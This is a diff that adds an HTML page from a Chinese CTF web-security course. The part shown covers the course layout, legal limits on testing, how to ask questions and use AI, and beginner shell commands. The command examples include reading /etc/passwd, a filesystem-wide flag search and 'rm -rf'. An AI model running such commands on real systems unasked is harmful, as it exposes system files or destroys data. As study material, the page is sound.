@@ -1,0 +1,2182 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>wei_web · CTF Web 方向 · 系统化学习中心（阅读版）</title>
+<style>
+:root { color-scheme: dark; --bg:#0f1115; --card:#161922; --card2:#1c2029; --border:#272c37; --text:#e6e9ef; --dim:#9aa3b2; --accent:#4d6bfe; --code:#0b0d12; }
+* { box-sizing: border-box; }
+body { margin:0; background:var(--bg); color:var(--text); font: 15px/1.75 -apple-system, "Segoe UI", "Microsoft YaHei", sans-serif; }
+.wrap { display:flex; min-height:100vh; }
+aside { width:280px; flex:0 0 280px; border-right:1px solid var(--border); padding:20px 14px; position:sticky; top:0; height:100vh; overflow:auto; background:var(--card); }
+aside .brand { font-weight:700; font-size:16px; margin-bottom:4px; }
+aside .brand small { color:var(--dim); font-weight:400; font-size:12px; margin-left:6px; }
+.tocmod { margin-top:12px; }
+.tochead { display:block; font-size:13px; font-weight:600; color:var(--text); text-decoration:none; padding:4px 0; }
+.tocles { display:flex; flex-direction:column; }
+.tocles a { font-size:12.5px; color:var(--dim); text-decoration:none; padding:2px 0 2px 10px; border-left:2px solid transparent; }
+.tocles a:hover { color:var(--accent); border-left-color:var(--accent); }
+main { flex:1; min-width:0; padding:36px 40px 90px; max-width:900px; }
+h1 { font-size:26px; margin:34px 0 4px; padding-top:14px; border-top:1px solid var(--border); }
+section.mod:first-child h1 { border-top:0; margin-top:0; }
+h2 { font-size:20px; margin:30px 0 6px; }
+h3 { font-size:15.5px; margin:22px 0 8px; }
+.meta, .sub { color:var(--dim); font-size:12.5px; }
+.goal { border:1px solid var(--border); border-left:3px solid var(--accent); background:var(--card); border-radius:8px; padding:12px 16px; margin:14px 0 20px; }
+.goal p { margin:4px 0 0; }
+blockquote.note { background:#161d33; border:1px solid var(--border); border-radius:8px; margin:0 0 16px; padding:12px 16px; font-size:14px; }
+ul, ol { padding-left:22px; }
+li { margin:4px 0; }
+code { font-family: ui-monospace, Consolas, "SF Mono", monospace; font-size:0.92em; color:#9db3ff; }
+.code { border:1px solid var(--border); border-radius:8px; overflow:hidden; margin:0 0 18px; background:var(--card); }
+.code .cbar { background:var(--card2); padding:6px 12px; font-size:11.5px; color:var(--dim); font-family: ui-monospace, Consolas, monospace; }
+.code pre { margin:0; padding:13px 15px; overflow-x:auto; background:var(--code); font-size:12.8px; line-height:1.65; }
+.tablewrap { border:1px solid var(--border); border-radius:8px; overflow-x:auto; margin:0 0 18px; }
+.tcap { background:var(--card2); padding:8px 12px; font-size:12px; color:var(--accent); }
+table { border-collapse:collapse; width:100%; font-size:13px; }
+th, td { border-top:1px solid var(--border); padding:8px 12px; text-align:left; vertical-align:top; }
+th { background:var(--card2); color:var(--dim); font-weight:600; white-space:nowrap; }
+ol.steps { list-style:none; padding-left:0; counter-reset:st; }
+ol.steps li { counter-increment:st; position:relative; padding:8px 12px 8px 40px; background:var(--card); border:1px solid var(--border); border-radius:8px; margin-bottom:7px; }
+ol.steps li::before { content:counter(st); position:absolute; left:11px; top:8px; width:20px; height:20px; border-radius:50%; background:var(--accent); color:#fff; font-size:11px; display:flex; align-items:center; justify-content:center; }
+ol.quiz li { background:var(--card); border:1px solid var(--border); border-radius:8px; margin-bottom:7px; padding:9px 14px; }
+ul.links a { color:var(--accent); }
+@media (max-width: 860px) {
+  .wrap { flex-direction:column; }
+  aside { width:auto; flex:none; height:auto; position:static; border-right:0; border-bottom:1px solid var(--border); }
+  main { padding:22px 18px 70px; }
+}
+</style>
+</head>
+<body>
+<div class="wrap">
+<aside>
+  <div class="brand">wei_web<small>CTF Web 方向 · 系统化学习中心</small></div>
+  <div class="meta">13 个 PART · 82 节</div>
+  <div class="tocmod"><a href="#m-p0" class="tochead">PART 0 · 开课准备</a><div class="tocles"><a href="#l-p0l0">从这里开始：零基础 10 节起步清单</a><a href="#l-p0l1">这门课的结构与用法</a><a href="#l-p0l2">授权与法律边界</a><a href="#l-p0l3">提问六要素与如何用 AI</a></div></div><div class="tocmod"><a href="#m-p0b" class="tochead">PART 0.5 · 环境与命令行</a><div class="tocles"><a href="#l-p0b1">终端、Shell、命令行：三个词到底是什么</a><a href="#l-p0b2">你这台 Windows 上的三个命令行环境</a><a href="#l-p0b3">20 个必会命令（够你用一整年）</a><a href="#l-p0b4">WSL + Ubuntu 上手：装好你的练习环境</a><a href="#l-p0b5">跑起你的第一个本地 Web 服务</a><a href="#l-p0b6">2–3 小时/周怎么学：22 周计划（82 节全学）</a></div></div><div class="tocmod"><a href="#m-p1" class="tochead">PART 1 · Web 地基</a><div class="tocles"><a href="#l-p1l1">HTML：网页的骨架</a><a href="#l-p1l2">CSS：样式，以及「被藏起来的东西」</a><a href="#l-p1l3">JavaScript：从看懂到能改页面</a><a href="#l-p1l4">在控制台写代码（Console 实战）</a><a href="#l-p1l5">开发者工具五个核心面板</a><a href="#l-p1l6">读源代码：从 F12 到读懂 app.js</a></div></div><div class="tocmod"><a href="#m-p2" class="tochead">PART 2 · HTTP 与状态</a><div class="tocles"><a href="#l-p2l1">HTTP 请求与响应结构</a><a href="#l-p2l2">请求方法与状态码</a><a href="#l-p2l3">Cookie、Session、Token</a><a href="#l-p2l4">用 curl 手动发请求</a><a href="#l-p2l5">第一个 flag（动手）</a></div></div><div class="tocmod"><a href="#m-p2b" class="tochead">PART 2.5 · Web 全景与攻击面</a><div class="tocles"><a href="#l-p2b1">四类组件：谁在做事，各自负责什么</a><a href="#l-p2b2">一次请求的六段旅程</a><a href="#l-p2b3">逐段攻击点地图：漏洞放在哪一段</a><a href="#l-p2b4">学什么：四块能力地图与课程导航</a><a href="#l-p2b5">方向前景：三类岗位与它们考什么</a></div></div><div class="tocmod"><a href="#m-p6" class="tochead">PART 3 · 工具与第一次解题</a><div class="tocles"><a href="#l-p6l1">Burp Suite 四件套</a><a href="#l-p6l2">Yakit、curl 与 CyberChef：更轻的三个工具</a><a href="#l-p6l3">信息收集：把题目面积缩小</a><a href="#l-p6l4">Docker 搭本地靶场</a><a href="#l-p6l5">外部手册怎么用：HackTricks 与 seccmd 攻击手册</a></div></div><div class="tocmod"><a href="#m-p3" class="tochead">PART 4 · 编程：JS / Python / PHP</a><div class="tocles"><a href="#l-p3l1">JS 进阶：fetch、JSON、异步</a><a href="#l-p3l2">JS 逆向入门：断点、美化、调试</a><a href="#l-p3l3">Python 环境与第一个脚本</a><a href="#l-p3l4">Python requests：把手工测试写成脚本</a><a href="#l-p3l5">Python 处理编码与批量验证</a><a href="#l-p3l6">PHP 基础语法与超全局变量</a><a href="#l-p3l7">PHP 弱类型与经典陷阱</a><a href="#l-p3l8">读 PHP 源码的固定套路</a></div></div><div class="tocmod"><a href="#m-p3d" class="tochead">PART 5 · 自己写一个 Web 应用</a><div class="tocles"><a href="#l-p3d1">为什么要自己写一个站</a><a href="#l-p3d2">需求与数据建模：先想清楚再写代码</a><a href="#l-p3d3">用 Flask 写登录与页面</a><a href="#l-p3d4">数据层：SQLite、参数化与事务</a><a href="#l-p3d5">上线前的安全检查清单，以及用 Burp 打自己的站</a></div></div><div class="tocmod"><a href="#m-p4" class="tochead">PART 6 · 框架认知</a><div class="tocles"><a href="#l-p4l1">技术栈全景：为什么是这个顺序</a><a href="#l-p4l2">PHP 框架：ThinkPHP 与它的考点</a><a href="#l-p4l3">Python / Flask：读源码与 SSTI 的根源</a><a href="#l-p4l4">Django / Java Spring / Node.js 概览</a><a href="#l-p4l5">如何快速识别一个站的技术栈</a></div></div><div class="tocmod"><a href="#m-p5" class="tochead">PART 7 · 漏洞体系</a><div class="tocles"><a href="#l-p5l1">漏洞全景与分类</a><a href="#l-p5l2">信息泄露</a><a href="#l-p5l3">SQL 注入（上）：原理与联合查询</a><a href="#l-p5l4">SQL 注入（下）：盲注、报错、绕过</a><a href="#l-p5l5">XSS：反射、存储、DOM</a><a href="#l-p5l6">文件上传</a><a href="#l-p5l7">路径穿越与文件包含</a><a href="#l-p5l8">命令执行与代码执行</a><a href="#l-p5l9">SSRF：让服务器替你访问</a></div></div><div class="tocmod"><a href="#m-p5b" class="tochead">PART 8 · 高级漏洞</a><div class="tocles"><a href="#l-p5l10">CSRF：借你的手发请求</a><a href="#l-p5l11">SSTI：模板注入</a><a href="#l-p5l12">XXE：XML 外部实体</a><a href="#l-p5l13">反序列化（PHP）</a><a href="#l-p5l14">反序列化（Java）与组件漏洞</a><a href="#l-p5l15">认证绕过：Session / JWT / Cookie</a><a href="#l-p5l16">逻辑漏洞与越权</a><a href="#l-p5l17">NoSQL 注入</a><a href="#l-p5l18">原型链污染</a></div></div><div class="tocmod"><a href="#m-p7" class="tochead">PART 9 · 渗透流程与解题方法论</a><div class="tocles"><a href="#l-p7w1">渗透测试全流程：一次授权的测试长什么样</a><a href="#l-p7w2">信息收集与资产测绘：先画地图再动手</a><a href="#l-p7w3">漏洞验证与利用：把「可能」变成「已证明」</a><a href="#l-p7w4">后渗透与内网：拿到 webshell 之后</a><a href="#l-p7w5">报告与合规：风险评级、复现步骤与修复建议</a><a href="#l-p7l1">拿到一道题的第一分钟：做这七件事</a><a href="#l-p7l2">题型识别决策树</a><a href="#l-p7l3">Web 题切入点清单（打印版）</a><a href="#l-p7l4">卡住了怎么办：五种破局</a><a href="#l-p7l5">WriteUp 六问复盘法</a><a href="#l-p7l6">比赛策略与赛前清单</a></div></div><div class="tocmod"><a href="#m-p8" class="tochead">PART 10 · 实战复盘</a><div class="tocles"><a href="#l-p8l1">入门题精讲：信息泄露类</a><a href="#l-p8l2">入门题精讲：SQL 注入全流程</a><a href="#l-p8l3">综合复盘：把学过的压成一张表</a><a href="#l-p8l4">下一阶段：如何持续进步</a></div></div>
+</aside>
+<main>
+<section class="mod" id="m-p0"><h1>PART 0 · 开课准备</h1><div class="sub">第 0 周 · 4 节</div><blockquote class="note">先立三根柱子：怎么用这门课、什么能测什么不能测、卡住了怎么问。</blockquote><article id="l-p0l0">
+<h2>从这里开始：零基础 10 节起步清单</h2>
+<div class="meta">约 15 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>不用自己判断从哪开始——照这份清单走完前 10 节（约 4–5 周），你就具备了继续往下学的全部前提。</p></div>
+<p>如果你是刚接触 Web 安全的新手、每周能投入 2–3 小时，不要一次性打开 82 节被吓到，<b>先只做这 10 节</b>。它们按依赖顺序排好，每节都能独立完成，不会卡在「前置知识没学」上。</p>
+<div class="tablewrap"><div class="tcap">前 10 节（约 4–5 周）</div><table><thead><tr><th>顺序</th><th>哪一节</th><th>为什么先学它</th><th>学完能做什么</th></tr></thead><tbody><tr><td>1</td><td>p0l2 授权与法律边界</td><td>先划清底线，避免把练习做成入侵</td><td>能判断一个测试行为合不合法</td></tr><tr><td>2</td><td>p0b1 终端 / Shell / 命令行</td><td>后面所有操作都在命令行里</td><td>知道自己敲的命令属于哪个环境</td></tr><tr><td>3</td><td>p0b3 20 个必会命令</td><td>不会走目录就跑不动任何工具</td><td>能独立在目录里走动、看文件</td></tr><tr><td>4</td><td>p0b4 WSL + Ubuntu 上手</td><td>装好 python / php / nginx</td><td>环境能跑，命令能执行</td></tr><tr><td>5</td><td>p0b5 起第一个本地 Web 服务</td><td>理解「服务 + 端口 + 地址」</td><td>能起静态站 / PHP 站 / Flask 站</td></tr><tr><td>6</td><td>p1l1 HTML：网页的骨架</td><td>看懂页面结构，才找得到隐藏内容</td><td>能读懂任意网页的骨架</td></tr><tr><td>7</td><td>p1l4 在控制台写代码</td><td>控制台是浏览器里最强的入口</td><td>能选元素、改 DOM、读 Cookie、发请求</td></tr><tr><td>8</td><td>p1l6 读源代码：从 F12 到读懂 app.js</td><td>这是 CTF 的第一个真实技能</td><td>能拿到 flag{r3ad_th3_s0urc3}</td></tr><tr><td>9</td><td>p2l1 HTTP 请求与响应结构</td><td>所有漏洞都发生在这四个部分里</td><td>能逐行拆解请求和响应</td></tr><tr><td>10</td><td>p2l5 第一个 flag（动手）</td><td>验证你确实会了</td><td>能拿到 flag{w3lc0me_t0_w3b}</td></tr></tbody></table></div>
+<h3>别等「学完再做题」：工具和刷题要尽早</h3>
+<p>一个常见的误区是「先把语言、框架、漏洞都学完，再开始做题」。实际正相反：<b>简单的 CTF 题不需要完整学语言</b>，学会抓包改包就能打掉一批新手题。所以这一版把工具和刷题提到 PART 3，Python 放在 PHP 之前，并把基础（PART 0–4）压到 7 周。<b>全部 82 节都要学，没有选修。</b></p>
+<div class="tablewrap"><div class="tcap">节奏对比</div><table><thead><tr><th>部分</th><th>旧节奏</th><th>新节奏</th><th>为什么</th></tr></thead><tbody><tr><td>PART 0–4 基础（含工具与编程）</td><td>10 周</td><td>7 周</td><td>基础靠「用到」，不靠一次学透</td></tr><tr><td>PART 6 框架</td><td>6 周</td><td>2 周</td><td>只求认得出、会查，不求精通</td></tr><tr><td>PART 7–10 漏洞 / 流程 / 实战</td><td>8 周</td><td>13 周</td><td>省下的时间给真正的考点</td></tr><tr><td>并行项</td><td>—</td><td>PART 3 起即可打题</td><td>工具和刷题不必等全部基础</td></tr></tbody></table></div>
+<h3>每周 2.5 小时怎么切</h3>
+<ol class="steps"><li><b>第 1 天 1 小时</b>：读一节，跟着敲命令 / 起服务（只看不敲等于没学）。</li><li><b>第 2 天 1 小时</b>：做本节自测 + 写 3 行笔记（「学会了什么、卡在哪」）。</li><li><b>第 3 天 30 分钟</b>：把命令和 payload 抄进自己的速查表，顺手复习上一节。</li></ol>
+<blockquote class="note">💡 打开左侧「🏠 学习面板」设置开始日期，22 周会自动排成每周几节；<b>某节卡住就记下来继续走</b>——基础阶段最怕的不是没懂，是停在一节上耗掉两周。</blockquote>
+<h3>靶场与资源</h3><ul class="links"><li><a href="https://www.ctfhub.com/" target="_blank" rel="noopener">CTFHub（公开靶场，练手用）</a></li></ul>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>这 10 节里，哪几节完全不需要你「理解代码」，只要会操作？</li><li>你为什么不该一开始就从 PART 7 漏洞体系开始？</li><li>把这 10 节排进你的日历（每周哪两天、几点），写进笔记。</li></ol>
+</article>
+<article id="l-p0l1">
+<h2>这门课的结构与用法</h2>
+<div class="meta">约 15 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>搞清 13 个模块的关系，知道自己现在该从哪一节开始。</p></div>
+<p>这门课分 13 个模块、一共 82 节。它不是「先学完所有语言再做题」，而是<b>四条线并行</b>：地基线（浏览器/HTTP）、工具线（抓包/靶场/查手册）、脚本线（Python 优先）、漏洞与流程线（18 类漏洞 + 渗透流程）。</p>
+<div class="tablewrap"><div class="tcap">四条线怎么并行</div><table><thead><tr><th>轨道</th><th>内容</th><th>什么时候开始</th><th>学到什么程度</th></tr></thead><tbody><tr><td>地基线</td><td>PART 0 / 0.5 / 1 / 2 / 2.5：环境、浏览器、HTTP、六段旅程</td><td>第 1 天</td><td>能拆请求、能读页面源码</td></tr><tr><td>工具线</td><td>PART 3：Burp、靶场、信息收集、查手册</td><td>第 3 周（地基一半时）</td><td>能改包、能打最简单的题</td></tr><tr><td>脚本线</td><td>PART 4 的 Python 三节 + PART 5：写站、写脚本</td><td>第 4 周（和工具线交替）</td><td>能写脚本复现手工操作</td></tr><tr><td>漏洞线</td><td>PART 7 / 8 的 18 节 + PART 9 渗透流程</td><td>第 10 周（脚本能跑之后）</td><td>每类漏洞能独立复现并写记录</td></tr></tbody></table></div>
+<p>模块顺序按依赖排好了，但<b>可以并行</b>：学到 PART 3 的工具时，就可以去 CTFHub 打最简单的题；Python 脚本可以在做题过程中练，不必等「学完 Python」；PHP 放在 Python 之后，因为读 PHP 源码要等你有能力打题了才有意义。</p>
+<blockquote class="note">💡 如果你完全零基础：先按 PART 0 → 0.5 → 1 → 2 走，然后 <b>在 PART 3 的工具部分停下来去打几道新手题</b>，再回来继续。所有模块都要学，但没有「必须全部学完才能开始做题」这回事。</blockquote>
+<p>左侧课程树可以折叠。点任意一节开始读。每节右上角有「标记完成」，勾上后进度条会自己走。</p>
+<p>每节底部的笔记框会自动保存到本机浏览器，关掉再开还在。学完一个模块，点左下角「导出笔记」备份成 Markdown。</p>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>13 个模块分成哪四条线？哪两条可以最早并行？</li><li>你现在应该从哪一节开始？为什么？</li><li>为什么 PHP 放在 Python 之后学？</li></ol>
+</article>
+<article id="l-p0l2">
+<h2>授权与法律边界</h2>
+<div class="meta">约 20 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>能清晰判断：我这个测试行为，合不合法。</p></div>
+<blockquote class="note">💡 无授权，不测试；有授权，不越界。</blockquote>
+<p>这一节不是走过场。学习安全技术最容易出事的地方，就是把「练习」做成「入侵」。</p>
+<ul><li>只测试自己拥有、或拿到明确书面授权的系统。</li><li>使用公开靶场前，先读并遵守平台规则。</li><li>不要扫描或攻击学校、企业、政府机构的网站。</li><li>不要因为「只是试一下」就向陌生站点发送攻击请求。</li><li>不要获取、保存、传播他人的隐私和业务数据。</li><li>发现真实漏洞，通过正规漏洞响应渠道报告，不要自行深入。</li></ul>
+<p>唯一安全的练习环境只有这五种：</p>
+<ul><li>自己控制的虚拟机或服务器</li><li>本地 Docker 容器</li><li>自己编写的测试程序</li><li>比赛提供的题目环境</li><li>明确允许安全测试的公开靶场（CTFHub、BUUCTF、NSSCTF、DVWA 等）</li></ul>
+<p>真实的渗透测试必须建立在授权之上，并且有明确范围、时间、禁止项。它和 CTF 的最大区别是：CTF 追求拿 flag，真实测试追求「发现并帮助修复风险」，且绝不能影响业务。</p>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>同学给你一个学校官网地址，说「你试试能不能进去」，你怎么回应？</li><li>你偶然发现某商业网站存在 SQL 注入，正确的处置顺序是什么？</li><li>为什么「题目环境」可以大胆尝试，而真实站点不行？</li></ol>
+</article>
+<article id="l-p0l3">
+<h2>提问六要素与如何用 AI</h2>
+<div class="meta">约 25 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>把「这题怎么做」升级成能被秒答的问题，并知道 AI 该用在哪、不该用在哪。</p></div>
+<p>零基础阶段最大的效率瓶颈不是智力，是提问质量。同一个问题，问得好 5 分钟解决，问得差三天没人理。</p>
+<p>高质量问题包含六要素：</p>
+<ul><li><b>目标</b>：我正在做什么？</li><li><b>环境</b>：操作系统、PHP/Python 版本、工具版本</li><li><b>预期</b>：我以为会发生什么？</li><li><b>实际</b>：实际发生了什么？（完整报错，不要只截一行）</li><li><b>已试</b>：我试过哪些方法？</li><li><b>卡点</b>：我具体不理解哪一步？</li></ul>
+<div class="code"><div class="cbar">反例 → 正例 · text</div><pre><code>&lt;反例&gt;
+师傅这题怎么做？我怎么什么都不会
+
+&lt;正例&gt;
+我判断这题可能是 SQL 注入，因为输入单引号后页面返回了数据库报错。
+我已用 order by 判断字段数为 3，并用 Burp 重放了请求。
+问题是：两次响应长度完全一致，我不知道该比较响应长度还是响应时间。
+附件：原始请求、两次响应、我试过的 payload。</code></pre></div>
+<p>搜索也一样。搜完整报错，不要搜情绪描述：</p>
+<div class="code"><div class="cbar">搜索方式对比 · text</div><pre><code>✗  PHP 报错怎么办？？？
+✓  "Warning: Undefined array key" PHP POST
+✓  flask jinja2 TemplateNotFound 报错</code></pre></div>
+<p>关于 AI：它可以帮你解释概念、读报错、分析代码执行流程、写示例、整理笔记。但<b>不要把整道题丢给它一把梭</b>——这个阶段解出题不是目的，学到东西才是。AI 还会一本正经地胡说八道，关键结论必须查官方文档并在本地验证。</p>
+<blockquote class="note">💡 向 AI 提问时，附上：代码、HTTP 请求与响应、报错原文、你已经试过什么、你具体卡在哪一句。给的信息越像「现场」，回答越准。</blockquote>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>把你最近真实卡住的一个问题，按六要素重写一遍，写进笔记。</li><li>为什么「把题目直接丢给 AI」对你这个阶段帮助有限？</li><li>AI 给你的 payload 在生产环境能直接跑吗？为什么？</li></ol>
+</article></section>
+<section class="mod" id="m-p0b"><h1>PART 0.5 · 环境与命令行</h1><div class="sub">第 0 周 · 开工前 · 6 节</div><blockquote class="note">你说过对 cmd、PowerShell、WSL 都不太熟——这一模块专门补这个。学完你会：分清三个命令行、背下 20 个命令、在 Ubuntu 里装好环境、跑起第一个本地 Web 服务。</blockquote><article id="l-p0b1">
+<h2>终端、Shell、命令行：三个词到底是什么</h2>
+<div class="meta">约 15 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>说清「终端 / Shell / 命令行 / 脚本」的区别，不再被这几个词绕晕。</p></div>
+<p>先拆开这三个词，它们经常被混着用，但指的是不同的东西：</p>
+<div class="tablewrap"><div class="tcap">三个概念</div><table><thead><tr><th>词</th><th>是什么</th><th>例子</th></tr></thead><tbody><tr><td>终端（Terminal）</td><td>一个窗口，负责显示文字、接收你敲的键</td><td>Windows Terminal、VS Code 的终端、Ubuntu 的 Terminal</td></tr><tr><td>Shell</td><td>终端里真正干活的程序：读你的命令、去执行、把结果打印出来</td><td>cmd.exe、PowerShell、bash、zsh</td></tr><tr><td>命令行（CLI）</td><td>「用文字下指令」这种交互方式本身，与图形界面相对</td><td>你在 Shell 里敲命令这件事</td></tr></tbody></table></div>
+<p>所以「打开命令行」= 打开一个终端 + 里面跑着一个 Shell。你在 cmd 里敲的是 cmd 的命令，在 PowerShell 里敲的是 PowerShell 的命令，在 Ubuntu 的终端里敲的是 bash 的命令——<b>它们长得像，但不完全一样</b>，这正是初学者最容易被绊倒的地方。</p>
+<div class="code"><div class="cbar">同一个意思，三种写法 · text</div><pre><code>             Windows cmd        PowerShell            Linux (bash)
+列出文件      dir                ls / Get-ChildItem    ls
+切换目录      cd 路径            cd 路径               cd 路径
+看当前目录    cd                 pwd                   pwd
+清屏          cls                cls                   clear
+看文件内容    type 文件          cat 文件 / Get-Content cat 文件
+新建文件夹    mkdir 名字         mkdir 名字            mkdir 名字
+删除文件      del 文件           rm 文件               rm 文件
+查帮助        help 命令           Get-Help 命令         man 命令</code></pre></div>
+<blockquote class="note">💡 本课程后面的命令默认写在 <b>Ubuntu / bash</b> 里（因为 CTF 靶场、题目环境基本都是 Linux）。你自己的 Windows 上也能用，但要知道哪些命令要换写法——下一节专门讲。</blockquote>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>终端、Shell、命令行分别指什么？</li><li>为什么同一个操作在 cmd、PowerShell、bash 里写法可能不同？</li><li>「打开命令行」实际上是打开了哪两样东西？</li></ol>
+</article>
+<article id="l-p0b2">
+<h2>你这台 Windows 上的三个命令行环境</h2>
+<div class="meta">约 20 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>分清 cmd、PowerShell、WSL 的关系，知道每件事该在哪个环境里做。</p></div>
+<div class="tablewrap"><div class="tcap">三个环境对照</div><table><thead><tr><th>环境</th><th>怎么打开</th><th>特点</th><th>适合做什么</th></tr></thead><tbody><tr><td>cmd（命令提示符）</td><td>Win+R → 输入 cmd → 回车</td><td>最老、最简单，命令少</td><td>临时跑个 exe、ping 一下、看版本</td></tr><tr><td>PowerShell</td><td>Win+X → 终端 / 搜索 PowerShell</td><td>功能强，能写脚本，命令是动词-名词式</td><td>Windows 上的文件批量操作、查进程、装工具</td></tr><tr><td>WSL（Ubuntu）</td><td>开始菜单搜 Ubuntu / 在终端输入 wsl</td><td>真正的 Linux 内核，和服务器几乎一样</td><td>跑靶场、装 python/php/nginx、练 Linux 命令</td></tr></tbody></table></div>
+<h3>先分清「你在哪」</h3>
+<ol class="steps"><li>打开后看提示符：<code>C:\Users\你&gt;</code> 是 cmd 或 PowerShell；<code>你@主机:~$</code> 是 WSL 的 bash。</li><li>在 PowerShell 里敲 <code>wsl</code> 回车就会进入 Ubuntu；在 Ubuntu 里敲 <code>exit</code> 回到 Windows。</li><li>在任意环境里敲 <code>pwd</code> 看当前目录：bash 认识，cmd 不认识（cmd 用 <code>cd</code> 看当前目录）。</li><li>不确定某个命令属于谁？先敲 <code>help</code> 或 <code>xxx --help</code>，能出来就是当前环境支持。</li></ol>
+<div class="code"><div class="cbar">一个容易踩的坑：路径写法 · text</div><pre><code>Windows 路径：  C:\Users\WEIHAO\Desktop\wei_web
+Linux 路径：    /home/weihao/wei_web
+
+WSL 访问 Windows 文件：/mnt/c/Users/WEIHAO/Desktop/wei_web
+Windows 访问 WSL 文件：\\wsl$\Ubuntu\home\weihao
+
+结论：同一个文件，两边路径写法完全不同。搞不清就用 pwd 看一眼。</code></pre></div>
+<blockquote class="note">💡 Windows + WSL 其实是最好的组合：<b>Windows 上写的东西放到 Ubuntu 里跑，Ubuntu 里的文件随时能用 Windows 的编辑器打开</b>。不用装虚拟机也不用折腾双系统。</blockquote>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>cmd、PowerShell、WSL 三个环境，各自最适合做什么？</li><li>在 PowerShell 里怎么进入 Ubuntu？在 Ubuntu 里怎么回 Windows？</li><li>WSL 里的 /mnt/c 对应 Windows 的什么位置？</li><li>为什么本课程的命令默认写 bash 的写法？</li></ol>
+</article>
+<article id="l-p0b3">
+<h2>20 个必会命令（够你用一整年）</h2>
+<div class="meta">约 30 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>把这 20 个命令练到不用查，能独立在目录里走动、看文件、跑服务。</p></div>
+<p>命令不用背全，先把下面 20 个练熟。你在 Ubuntu 里敲（Windows 的 cmd 里有些名字不一样，对照着看）。</p>
+<div class="tablewrap"><div class="tcap">目录与文件（最常用）</div><table><thead><tr><th>命令</th><th>作用</th><th>例子</th></tr></thead><tbody><tr><td>pwd</td><td>我在哪（打印当前目录）</td><td>pwd</td></tr><tr><td>ls -la</td><td>看这个目录有什么（含隐藏文件）</td><td>ls -la</td></tr><tr><td>cd 目录</td><td>进入目录；cd .. 返回上一级；cd ~ 回家目录</td><td>cd /var/www</td></tr><tr><td>mkdir -p 目录</td><td>新建目录（-p 连父目录一起建）</td><td>mkdir -p web/test</td></tr><tr><td>touch 文件</td><td>新建空文件 / 更新时间戳</td><td>touch a.txt</td></tr><tr><td>cp -r 源 目标</td><td>复制文件或目录</td><td>cp -r src/ backup/</td></tr><tr><td>mv 源 目标</td><td>移动 / 重命名</td><td>mv a.txt b.txt</td></tr><tr><td>rm -rf 目录</td><td>删除（很危险，-rf 是递归强制，别乱用）</td><td>rm -rf old/</td></tr><tr><td>cat 文件</td><td>把文件内容打印出来</td><td>cat /etc/passwd</td></tr><tr><td>less 文件</td><td>分页看长文件（q 退出）</td><td>less access.log</td></tr></tbody></table></div>
+<div class="tablewrap"><div class="tcap">查找、网络、运行</div><table><thead><tr><th>命令</th><th>作用</th><th>例子</th></tr></thead><tbody><tr><td>grep 关键字 文件</td><td>在文件里搜字符串</td><td>grep flag access.log</td></tr><tr><td>find 目录 -name 模式</td><td>按名字找文件</td><td>find / -name "flag*"</td></tr><tr><td>chmod +x 文件</td><td>给执行权限</td><td>chmod +x run.sh</td></tr><tr><td>ps aux</td><td>看所有进程</td><td>ps aux | grep python</td></tr><tr><td>kill 进程号</td><td>结束进程</td><td>kill 1234</td></tr><tr><td>curl 网址</td><td>发 HTTP 请求（最常用）</td><td>curl -i http://127.0.0.1:8000/</td></tr><tr><td>ping 地址</td><td>测连通性</td><td>ping -c 3 baidu.com</td></tr><tr><td>sudo 命令</td><td>用管理员权限执行</td><td>sudo apt update</td></tr><tr><td>apt install 包</td><td>安装软件</td><td>sudo apt install nginx</td></tr><tr><td>history</td><td>看之前敲过什么</td><td>history | tail -20</td></tr></tbody></table></div>
+<div class="code"><div class="cbar">几个马上就用的组合 · bash</div><pre><code># 看某个端口有没有被占用
+ss -tlnp | grep 8000
+
+# 把命令输出写到文件（&gt; 覆盖，&gt;&gt; 追加）
+ls -la &gt; list.txt
+
+# 管道：把前一个命令的输出交给后一个
+ps aux | grep nginx
+
+# 后台运行一个服务，日志写到文件
+python3 -m http.server 8000 &gt; server.log 2&gt;&amp;1 &amp;
+
+# 结束它
+kill %1</code></pre></div>
+<blockquote class="note">💡 记命令的正确方式不是抄，而是<b>每用一次就把当天的命令记进笔记</b>。这门课每节底下都有笔记框，专门给你记这些。</blockquote>
+<h3>靶场与资源</h3><ul class="links"><li><a href="https://explainshell.com/" target="_blank" rel="noopener">Linux 命令速查（交互式）</a></li></ul>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>怎么查看当前目录下所有文件（含隐藏文件）？</li><li>cd ..、cd ~、cd / 分别去哪？</li><li>怎么在文件里搜一个字符串？</li><li>curl 和浏览器访问网页的区别是什么？</li><li>rm -rf 为什么危险？</li></ol>
+</article>
+<article id="l-p0b4">
+<h2>WSL + Ubuntu 上手：装好你的练习环境</h2>
+<div class="meta">约 30 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>在 Ubuntu 里装好 python3、php、nginx，并把项目文件放到能两边访问的位置。</p></div>
+<p>你已经装了 Ubuntu，这节把它变成能干活的环境。全程在 <b>Ubuntu 终端</b>里操作（开始菜单搜 Ubuntu，或在 PowerShell 里敲 wsl）。</p>
